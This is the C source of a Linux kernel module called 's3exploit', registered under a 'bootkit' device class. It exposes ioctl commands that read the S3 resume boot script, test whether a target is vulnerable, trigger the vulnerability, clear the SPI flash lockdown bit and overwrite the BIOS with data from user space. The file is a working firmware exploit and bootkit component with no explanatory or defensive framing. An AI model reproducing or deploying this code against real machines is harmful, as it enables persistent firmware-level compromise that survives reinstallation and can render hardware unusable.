#include "linux/device/class.h"
#include "linux/mutex.h"
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include "s3exploit_ioctl.h"

#include "s3exploit.h"

MODULE_LICENSE("GPL");

struct module_struct_t {
    dev_t dev;
    struct cdev *cdev;
    struct class *class;
    struct device *device;
    struct file_operations fops;

    struct s3exploit *s3exploit;
};

DEFINE_MUTEX(dev_lock);

static int device_open(struct inode *inode, struct file *filp);
static int device_close(struct inode *inode, struct file *filp);
static long device_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);

static struct module_struct_t module_struct = {
    .fops = {
        .owner = THIS_MODULE,
        .open = &device_open,
        .release = &device_close,
        .unlocked_ioctl = &device_ioctl
    }
};

static const char *DEVICE_NAME = "s3exploit";
static const char *DEVICE_CLASS = "bootkit";

int __init init_module(void) {
    int status;

    mutex_init(&dev_lock);

    module_struct.s3exploit = s3exploit_init();
    if (IS_ERR(module_struct.s3exploit))
        return PTR_ERR(module_struct.s3exploit);

    status = alloc_chrdev_region(&module_struct.dev, 0, 1, DEVICE_NAME);
    if (status < 0)
        goto error_free_s3exploit;
    
    module_struct.cdev = cdev_alloc();
    if (!module_struct.cdev) {
        status = -ENOMEM;
        goto error_free_chrdev_region;
    }
    module_struct.cdev->ops = &module_struct.fops;

    module_struct.class = class_create(THIS_MODULE, DEVICE_CLASS);
    if (IS_ERR(module_struct.class)) {
        status = PTR_ERR(module_struct.class);
        goto error_free_cdev;
    }

    module_struct.device = device_create(module_struct.class, NULL, 
            module_struct.dev, NULL, DEVICE_NAME);
    if (IS_ERR(module_struct.device)) {
        status = PTR_ERR(module_struct.device);
        goto error_free_class;
    }

    status = cdev_add(module_struct.cdev, module_struct.dev, 1);
    if (status < 0)
        goto error_free_device;

    printk(KERN_INFO "s3exploit: Module loaded\n");
    return 0;

error_free_device:
    device_destroy(module_struct.class, module_struct.dev);
    class_unregister(module_struct.class);

error_free_class:
    class_destroy(module_struct.class);

error_free_cdev:
    cdev_del(module_struct.cdev);

error_free_chrdev_region:
    unregister_chrdev_region(module_struct.dev, 1);

error_free_s3exploit:
    s3exploit_deinit(module_struct.s3exploit);

    mutex_destroy(&dev_lock);

    return status;
}

void __exit cleanup_module(void) {
    device_destroy(module_struct.class, module_struct.dev);
    class_unregister(module_struct.class);
    class_destroy(module_struct.class);
    cdev_del(module_struct.cdev);
    unregister_chrdev_region(module_struct.dev, 1);
    mutex_destroy(&dev_lock);
    printk(KERN_INFO "s3exploit: Module unloaded\n");
}

static int device_open(struct inode *inode, struct file *filp) {
    if (mutex_trylock(&dev_lock) == 0) 
        return -EBUSY;

    return 0;
}

static int device_close(struct inode *inode, struct file *filp) {
    mutex_unlock(&dev_lock);
    return 0;
}

static long device_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    int status;
    phys_addr_t bootscript_addr;
    size_t bootscript_size;
    uint8_t *bootscript_copy;
    int target_vulnerable;
    struct spi_flash_info info;
    struct bios_overwrite_header ovr_header;
    void *buffer;

    switch (cmd) {
        case S3EXPLOIT_GET_BOOTSCRIPT_ADDR:
            bootscript_addr = s3exploit_get_bootscript_addr(module_struct.s3exploit);
            if (copy_to_user((void *)arg, &bootscript_addr, sizeof(bootscript_addr)))
                return -EFAULT;
            break;

        case S3EXPLOIT_GET_BOOTSCRIPT_SIZE:
            bootscript_size = s3exploit_get_bootscript_size(module_struct.s3exploit);
            if (copy_to_user((void *) arg, &bootscript_size, sizeof(bootscript_size)))
                return -EFAULT;
            break;

        case S3EXPLOIT_GET_BOOTSCRIPT:
            bootscript_copy = s3exploit_get_bootscript_copy(module_struct.s3exploit);
            bootscript_size = s3exploit_get_bootscript_size(module_struct.s3exploit);
            if (copy_to_user((void *) arg, bootscript_copy, bootscript_size))
                return -EFAULT;
            break;

        case S3EXPLOIT_TRIGGER_VULN:
            return s3exploit_trigger_vuln(module_struct.s3exploit, arg);
            break;

        case S3EXPLOIT_CHECK_IF_VULN:
            target_vulnerable = s3exploit_check_target(module_struct.s3exploit);
            if (copy_to_user((void *) arg, &target_vulnerable, sizeof(target_vulnerable)))
                return -EFAULT;
            break;

        case S3EXPLOIT_GET_FLASH_INFO:
            if (copy_from_user(&info, (void *) arg, sizeof(info)))
                    return -EFAULT;
            status = s3exploit_get_flash_info(module_struct.s3exploit, &info);
            if (status < 0)
                return status;
            if (copy_to_user((void *) arg, &info, sizeof(info)))
                return -EFAULT;
            break;

        case S3EXPLOIT_SET_FLASH_INFO:
            if (copy_from_user(&info, (void *) arg, sizeof(info)))
                    return -EFAULT;
            status = s3exploit_set_flash_info(module_struct.s3exploit, &info);
            if (status < 0)
                return status;
            break;

        case S3EXPLOIT_RESET_FLOCKDN_BIT:
            return s3exploit_reset_flockdn_bit(module_struct.s3exploit);
            break;
            
        case S3EXPLOIT_OVERWRITE_BIOS:
            if (copy_from_user(&ovr_header, (void *) arg, sizeof(ovr_header)))
                return -EFAULT;

            buffer = kmalloc(ovr_header.size, GFP_KERNEL);
            if (!buffer)
                return -ENOMEM;

            if (copy_from_user(buffer, ovr_header.data, ovr_header.size)) {
                kfree(buffer);
                return -EFAULT;
            }

            status = s3exploit_overwrite_bios(module_struct.s3exploit, buffer, ovr_header.size, ovr_header.offset); 
            return status;
            break;
            

    }

    return 0;
}

